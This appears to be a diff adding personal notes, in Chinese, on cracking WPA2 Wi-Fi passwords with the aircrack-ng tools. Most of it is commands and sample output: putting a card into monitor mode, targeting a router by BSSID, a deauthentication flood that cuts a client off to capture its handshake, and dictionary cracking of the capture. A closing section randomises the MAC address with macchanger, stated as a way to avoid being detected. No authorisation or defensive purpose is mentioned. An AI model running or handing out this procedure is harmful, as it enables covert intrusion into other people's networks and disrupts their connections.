@@ -1,0 +1,39 @@
+iwconfig 查看网卡信息
+
+airmon-ng 查看无线网卡的驱动版本信息；interface:为网卡名一般wlan0
+
+airmon-ng start wlan0 启动无线网卡的监听;启动之后,无线网卡的名字变为 wlan0mon ：即变为了moniter(监听模式)
+	wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.447 GHz  Tx-Power=20 dBm   
+			  Retry short  long limit:2   RTS thr:off   Fragment thr:off
+			  Power Management:off
+			  
+	eth0      no wireless extensions.
+
+	lo        no wireless extensions.
+
+airodump-ng wlan0mon
+	开始扫描wifi信号:注意①BSSID 这个是网卡信息 ②Data 有数据传递(有数据传递的握手包,才可以破解) ③ CH 频道号
+	 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                      
+	 B0:95:8E:XXXXXXXX  -34       15        1    0   6  405  WPA2 CCMP   PSK  Mi_MAX      
+	 B0:95:8E:XXXXXXXX  -34        9        0    0   6  405  WPA2 CCMP   PSK  Mi_MAX      
+airodump-ng --bssid B0:95:8E:08:E2:A0 -c 6 -w 85wap2 wlan0mon  开始监听对应mac地址的路由器,--bssid为mac地址;-c为channel;-w为获取到的数据包存储名;wlan0mon为当前监听使用的网卡名
+
+aireplay-ng -a B0:95:8E:08:E2:A0 -c 74:23:44:27:68:DC -0 50 wlan0mon
+我们要使用命令切断客户端与路由器的连接，从而让客户端重新连接路由器 产生握手包
+
+aircrack-ng 文件.cap -w /root/字典 
+跑包破解
+=================
+为了使你的mac地址不被侦测到,修改自己的无线网卡的MAC地址
+kali中:macchanger命令
+查看所有的网卡信息
+iwconfig
+查看自己的无线网卡MAC地址
+ifconfig wlan0mon
+ifconfig wlan0mon down //修改mac地址之前，需要先关掉无线网卡
+macchanger -r wlan0mon //随机为wlan0mon网卡 生成一个MAC地址
+ifconfig wlan0mon up   //重新启用wlan0mon网卡
+
+
+
